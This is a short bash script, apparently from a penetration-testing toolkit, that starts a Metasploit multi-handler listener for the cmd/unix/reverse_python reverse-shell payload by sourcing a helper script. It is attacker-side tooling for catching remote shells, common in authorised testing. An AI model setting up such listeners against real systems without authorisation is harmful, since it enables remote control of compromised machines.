#!/bin/bash

: '
meterpreter: start meterpreter listener cmd/unix/reverse_python
'

source ${SCRIPTS_DIR}/shell/msfconsole/.files/listen_to_meterpreter_rev_shell.sh

PAYLOAD="cmd/unix/reverse_python"

create_meterpreter_multi_handler "${PAYLOAD}"
